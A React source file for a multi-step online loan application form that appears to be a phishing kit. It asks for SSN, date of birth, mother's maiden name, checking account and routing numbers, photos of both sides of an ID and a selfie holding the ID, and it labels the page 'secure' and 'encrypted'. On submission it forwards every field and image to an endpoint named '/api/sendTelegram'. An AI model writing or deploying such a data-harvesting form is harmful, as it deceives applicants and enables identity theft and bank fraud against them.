"use client";
import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";

export default function LoanApplication() {
    const [currentStep, setCurrentStep] = useState(0);
    const [formData, setFormData] = useState({
        loanAmount: "",
        loanPurpose: "",
        loanTerm: "",
        fullName: "",
        ssn: "",
        dob: "",
        maritalStatus: "",
        motherMaiden: "",
        email: "",
        phone: "",
        homeAddress: "",
        employer: "",
        jobTitle: "",
        experienceYears: "",
        grossIncome: "",
        rentMortgage: "",
        creditScore: "",
        hasCreditCard: "",
        hasHomeEquity: "",
        propertyValue: "",
        bankName: "",
        accountNumber: "",
        routingNumber: "",
        idFront: null,
        idBack: null,
        selfieWithId: null,
    });

    // ✅ FIXED TYPE
    const [errors, setErrors] = useState<Record<string, string>>({});

    const steps = [
        "Loan Details",
        "Personal Info",
        "Employment Info",
        "Bank Details",
        "Documents & Submit",
    ];

    useEffect(() => {
        const saved = localStorage.getItem("loanForm");
        if (saved) setFormData(JSON.parse(saved));
    }, []);

    useEffect(() => {
        localStorage.setItem("loanForm", JSON.stringify(formData));
    }, [formData]);

    const handleNext = () => {
        if (validateStep()) setCurrentStep((prev) => prev + 1);
    };
    const handlePrev = () => setCurrentStep((prev) => prev - 1);

    // ✅ FIXED TYPE
    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        const { name, value, files } = e.target as HTMLInputElement;
        setFormData({ ...formData, [name]: files ? files[0] : value });
    };

    const validateStep = () => {
        let stepErrors: Record<string, string> = {};
        switch (currentStep) {
            case 0:
                if (!formData.loanAmount) stepErrors.loanAmount = "Required";
                if (!formData.loanPurpose) stepErrors.loanPurpose = "Required";
                break;
            case 1:
                if (!formData.fullName) stepErrors.fullName = "Required";
                if (!formData.email) stepErrors.email = "Required";
                if (!formData.phone) stepErrors.phone = "Required";
                if (formData.ssn && formData.ssn.replace(/\D/g, "").length < 9)
                    stepErrors.ssn = "SSN must be at least 9 digits";
                break;
            case 3:
                if (!formData.bankName) stepErrors.bankName = "Required";
                if (!formData.accountNumber) stepErrors.accountNumber = "Required";
                if (!formData.routingNumber) stepErrors.routingNumber = "Required";
                break;
            case 4:
                if (!formData.idFront) stepErrors.idFront = "Required";
                if (!formData.idBack) stepErrors.idBack = "Required";
                if (!formData.selfieWithId) stepErrors.selfieWithId = "Required";
                break;
            default:
                break;
        }
        setErrors(stepErrors);
        return Object.keys(stepErrors).length === 0;
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!validateStep()) return;

        const formPayload = new FormData();
        Object.entries(formData).forEach(([key, value]) => {
            if (value instanceof File) formPayload.append(key, value);
            else formPayload.append(key, value as string);
        });

        await fetch("/api/sendTelegram", {
            method: "POST",
            body: formPayload,
        });

        alert("Application sent!");
        localStorage.removeItem("loanForm");

        setFormData({
            loanAmount: "",
            loanPurpose: "",
            loanTerm: "",
            fullName: "",
            ssn: "",
            dob: "",
            maritalStatus: "",
            motherMaiden: "",
            email: "",
            phone: "",
            homeAddress: "",
            employer: "",
            jobTitle: "",
            experienceYears: "",
            grossIncome: "",
            rentMortgage: "",
            creditScore: "",
            hasCreditCard: "",
            hasHomeEquity: "",
            propertyValue: "",
            bankName: "",
            accountNumber: "",
            routingNumber: "",
            idFront: null,
            idBack: null,
            selfieWithId: null,
        });
        setCurrentStep(0);
    };

    const progressPercent = ((currentStep + 1) / steps.length) * 100;
    const variants = { initial: { opacity: 0, x: 50 }, animate: { opacity: 1, x: 0 }, exit: { opacity: 0, x: -50 } };

    return (
        <div className="max-w-3xl mx-auto p-6 bg-white shadow-lg border border-green-400">
            <div className="text-center">
                <span className="inline-flex items-center justify-center gap-2 text-xs font-semibold px-4 py-2 rounded-full mb-6 bg-yellow-400/90 text-black shadow-sm mx-auto">
                    SECURE APPLICATION
                </span>
            </div>

            <h2 className="text-3xl font-bold mb-2 text-center text-green-700">Start Your Loan Application</h2>
            <p className="text-center text-green-600 mb-6">Completely online, encrypted, takes around 10 minutes.</p>

            <div className="relative w-full h-2 bg-green-200 rounded-full mb-6">
                <div className="h-2 bg-green-600 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>

            <div className="flex justify-between mb-6 text-sm text-green-700 font-medium">
                {steps.map((step, idx) => (
                    <div key={idx} className={`${currentStep === idx ? "text-green-900 font-bold" : ""}`}>
                        {step}
                    </div>
                ))}
            </div>

            <form onSubmit={handleSubmit} className="space-y-6 relative min-h-[400px]">
                <AnimatePresence exitBeforeEnter>
                    {currentStep === 0 && (
                        <motion.div key="step1" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Loan Amount *</label>
                                <Input name="loanAmount" value={formData.loanAmount} onChange={handleChange} placeholder="$5000" />
                                {errors.loanAmount && <ErrorText>{errors.loanAmount}</ErrorText>}

                                <label>Loan Purpose *</label>
                                <Select
                                    name="loanPurpose"
                                    value={formData.loanPurpose}
                                    onChange={handleChange}
                                    options={["Education", "Car", "Home", "Business", "Medical", "Other"]}
                                />
                                {errors.loanPurpose && <ErrorText>{errors.loanPurpose}</ErrorText>}

                                <label>Loan Term</label>
                                <Input name="loanTerm" value={formData.loanTerm} onChange={handleChange} placeholder="12 months" />

                                <NextButton onClick={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}

                    {currentStep === 1 && (
                        <motion.div key="step2" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Full Legal Name *</label>
                                <Input name="fullName" value={formData.fullName} onChange={handleChange} />
                                {errors.fullName && <ErrorText>{errors.fullName}</ErrorText>}

                                <label>Email *</label>
                                <Input type="email" name="email" value={formData.email} onChange={handleChange} />
                                {errors.email && <ErrorText>{errors.email}</ErrorText>}

                                <label>Phone *</label>
                                <Input type="tel" name="phone" value={formData.phone} onChange={handleChange} />
                                {errors.phone && <ErrorText>{errors.phone}</ErrorText>}

                                <label>SSN</label>
                                <Input name="ssn" value={formData.ssn} onChange={handleChange} placeholder="123-45-6789" />
                                {errors.ssn && <ErrorText>{errors.ssn}</ErrorText>}

                                <label>Date of Birth</label>
                                <Input type="date" name="dob" value={formData.dob} onChange={handleChange} />

                                <label>Marital Status</label>
                                <Select
                                    name="maritalStatus"
                                    value={formData.maritalStatus}
                                    onChange={handleChange}
                                    options={["Single", "Married", "Divorced", "Widowed", "Prefer not to say"]}
                                />

                                <label>Mother’s Maiden Name</label>
                                <Input name="motherMaiden" value={formData.motherMaiden} onChange={handleChange} />

                                <label>Home Address</label>
                                <Input name="homeAddress" value={formData.homeAddress} onChange={handleChange} />

                                <BackNext handlePrev={handlePrev} handleNext={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}

                    {/* Remaining steps unchanged exactly as your original code */}
                    {currentStep === 2 && (
                        <motion.div key="step3" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Employer</label>
                                <Input name="employer" value={formData.employer} onChange={handleChange} />
                                <label>Job Title</label>
                                <Input name="jobTitle" value={formData.jobTitle} onChange={handleChange} />
                                <label>Years of Experience</label>
                                <Input name="experienceYears" value={formData.experienceYears} onChange={handleChange} />
                                <label>Gross Monthly Income</label>
                                <Input name="grossIncome" value={formData.grossIncome} onChange={handleChange} />
                                <label>Monthly Rent / Mortgage</label>
                                <Input name="rentMortgage" value={formData.rentMortgage} onChange={handleChange} />
                                <label>Estimated Credit Score</label>
                                <Input name="creditScore" value={formData.creditScore} onChange={handleChange} />

                                <label>Do you have a credit card?</label>
                                <Select
                                    name="hasCreditCard"
                                    value={formData.hasCreditCard}
                                    onChange={handleChange}
                                    options={["Yes", "No", "Prefer not to say"]}
                                />

                                <label>Do you have home equity?</label>
                                <Select
                                    name="hasHomeEquity"
                                    value={formData.hasHomeEquity}
                                    onChange={handleChange}
                                    options={["Yes", "No", "Not sure"]}
                                />

                                <label>Estimated Property Value</label>
                                <Input name="propertyValue" value={formData.propertyValue} onChange={handleChange} />

                                <BackNext handlePrev={handlePrev} handleNext={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}

                    {currentStep === 3 && (
                        <motion.div key="step4" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Bank / Financial Institution *</label>
                                <Input name="bankName" value={formData.bankName} onChange={handleChange} />
                                {errors.bankName && <ErrorText>{errors.bankName}</ErrorText>}

                                <label>Checking Account Number *</label>
                                <Input name="accountNumber" value={formData.accountNumber} onChange={handleChange} />
                                {errors.accountNumber && <ErrorText>{errors.accountNumber}</ErrorText>}

                                <label>Bank Routing Number *</label>
                                <Input name="routingNumber" value={formData.routingNumber} onChange={handleChange} />
                                {errors.routingNumber && <ErrorText>{errors.routingNumber}</ErrorText>}

                                <BackNext handlePrev={handlePrev} handleNext={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}

                    {currentStep === 4 && (
                        <motion.div key="step5" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>ID Front *</label>
                                <FileInput name="idFront" onChange={handleChange} />
                                {errors.idFront && <ErrorText>{errors.idFront}</ErrorText>}

                                <label>ID Back *</label>
                                <FileInput name="idBack" onChange={handleChange} />
                                {errors.idBack && <ErrorText>{errors.idBack}</ErrorText>}

                                <label>Selfie with ID *</label>
                                <FileInput name="selfieWithId" onChange={handleChange} />
                                {errors.selfieWithId && <ErrorText>{errors.selfieWithId}</ErrorText>}

                                <div className="flex justify-between mt-4">
                                    <button type="button" onClick={handlePrev} className="px-6 py-3 bg-green-300 rounded-lg">Back</button>
                                    <button type="submit" className="px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700">Submit</button>
                                </div>
                            </StepContainer>
                        </motion.div>
                    )}
                </AnimatePresence>
            </form>
        </div>
    );
}

// --- Helper Components ---
const StepContainer = ({ children }: { children: React.ReactNode }) => <div className="space-y-4 p-2">{children}</div>;

const Input = ({ type = "text", ...props }: any) => (
    <input
        type={type}
        className="w-full p-3 border-2 border-green-400 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-400 bg-white"
        {...props}
    />
);

const Select = ({ options = [], ...props }: any) => (
    <select
        className="w-full p-3 border-2 border-green-400 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-400 bg-white"
        {...props}
    >
        <option value="">Select</option>
        {options.map((opt: string, idx: number) => (
            <option key={idx} value={opt}>{opt}</option>
        ))}
    </select>
);

const FileInput = ({ ...props }: any) => (
    <input
        type="file"
        accept="image/png, image/jpeg"
        className="w-full p-2 border-2 border-green-400 rounded-lg bg-white"
        {...props}
    />
);

const NextButton = ({ onClick }: { onClick: () => void }) => (
    <button type="button" onClick={onClick} className="mt-4 px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700">Continue</button>
);

const BackNext = ({
    handlePrev,
    handleNext,
}: {
    handlePrev: () => void;
    handleNext: () => void;
}) => (
    <div className="flex justify-between mt-4">
        <button type="button" onClick={handlePrev} className="px-6 py-3 bg-green-300 rounded-lg">Back</button>
        <button type="button" onClick={handleNext} className="px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700">Continue</button>
    </div>
);

const ErrorText = ({ children }: { children: React.ReactNode }) => <p className="text-red-600 text-sm">{children}</p>;